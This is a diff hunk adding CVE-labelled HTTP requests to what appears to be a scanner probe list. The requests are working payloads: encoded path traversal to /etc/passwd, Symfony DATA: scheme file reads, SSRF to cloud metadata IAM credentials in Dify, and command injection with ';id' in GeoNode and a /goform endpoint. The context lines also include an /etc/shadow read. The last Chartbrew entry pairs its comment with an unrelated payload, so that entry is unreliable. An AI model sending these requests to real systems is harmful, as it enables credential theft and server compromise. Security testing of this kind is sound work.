@@ -5225,3 +5225,34 @@ POST /tikz/svg header="Content-Type: text/plain" body="\\openin1=/etc/shadow"
 #     parameter to /bin/rftest.sh through system(). ---
 POST /goform/mp header="Content-Type: application/x-www-form-urlencoded" body="command=;id"
 POST /goform/mp header="Content-Type: application/x-www-form-urlencoded" body="command=1%3Bcat%20%2Fetc%2Fpasswd"
+
+# --- CVE-2026-102657 (esm.sh): the static file handler joins the decoded URL
+#     path without confining it, so encoded dot segments escape AppDir. ---
+GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd
+GET /static/%2e%2e/%2e%2e/etc/passwd
+GET /%252e%252e/%252e%252e/etc/passwd
+
+# --- CVE-2026-121623 / CVE-2026-118515 (Symfony Serializer): an uppercase
+#     DATA: scheme and a subclassed UploadedFile path are treated as local
+#     files, so the denormalized object reads an arbitrary server path. ---
+POST /api/users header="Content-Type: application/json" body="{\"image\":\"DATA:,/../../../etc/passwd\"}"
+POST /api/users header="Content-Type: application/json" body="{\"image\":{\"path\":\"/etc/passwd\",\"originalName\":\"a.png\",\"test\":true}}"
+
+# --- CVE-2026-58141 (Dify): the remote-files helpers fetch a caller URL that
+#     the Squid source ACLs do not restrict by destination. ---
+GET /console/api/remote-files/http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F
+POST /console/api/remote-files/upload header="Content-Type: application/json" body="{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}"
+
+# --- CVE-2026-33050 (GeoNode): the uploaded vector layer name is passed to a
+#     shell command without validation. ---
+POST /layers/upload header="Content-Type: application/x-www-form-urlencoded" body="layer_name=roads;id&layer_title=roads"
+
+# --- CVE-2026-102344 (Lavish): POST /api/sessions opens a caller-selected
+#     path and returns its deterministic artifact key. ---
+POST /api/sessions header="Content-Type: application/json" body="{\"path\":\"/etc/passwd\"}"
+
+# --- CVE-2026-86005 (Chartbrew): the BullMQ dashboard is mounted at
+#     /apps/queues without an authentication check. ---
+GET /apps/queues
+GET /apps/queues/overview
+POST /api/users header="Content-Type: application/json" body="{\"image\":\"DATA:,/app/storage/settings.yml\"}"
